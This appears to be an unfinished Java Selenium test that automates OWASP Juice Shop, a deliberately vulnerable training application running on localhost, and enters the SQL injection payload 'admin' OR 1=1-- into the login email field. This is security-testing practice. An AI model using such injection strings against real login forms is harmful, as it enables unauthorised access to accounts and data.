package com.SQLSecurityProbe.test;

import org.openqa.selenium.By;
import org.openqa.selenium.Proxy;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;
import org.testng.Assert;
import org.openqa.selenium.Alert;
import org.testng.annotations.AfterClass;
import org.testng.annotations.BeforeClass;
import org.testng.annotations.Test;
public class SQLSecurityTest {
	  public static void main(String[] args) {
		  try {
	            // Set the path to the chromedriver executable
	            System.setProperty("webdriver.chrome.driver", "ChromeDriver/chromedriver.exe");

	            // Create a new instance of ChromeDriver
	            WebDriver driver = new ChromeDriver();

	            // Open OWASP JuiceShop's homepage
	            driver.get("http://localhost:3000");
	            Thread.sleep(1000);
	         
	            //Dissmiss Button
	            WebElement firstDismissButton = driver.findElement(By.xpath("//span[text()='Dismiss']"));
	            firstDismissButton.click();
	            
	            //Account Button
	            WebElement accountButton = driver.findElement(By.cssSelector("button#navbarAccount>span>span"));
	            accountButton.click();
	            
	            //Login Button
	            WebElement loginButton = driver.findElement(By.id("navbarLoginButton"));
	            loginButton.click();
	            
	          
	            
	            WebElement emailField = driver.findElement(By.xpath("//input[@name='email']"));
	            emailField.sendKeys("admin' OR 1=1--");
	           

	           // WebElement emailField = driver.findElement(By.id("email"));
	           // WebElement passwordField = driver.findElement(By.id("password"));
	            //WebElement submitButton = driver.findElement(By.id("loginButton"));

	            // Print the title of the page
	            System.out.println("Page title is: " + driver.getTitle());

	            // Close the browser window
	            // driver.quit();
	        } catch (Exception e) {
	            e.printStackTrace();
	        }
	       
	    }
}
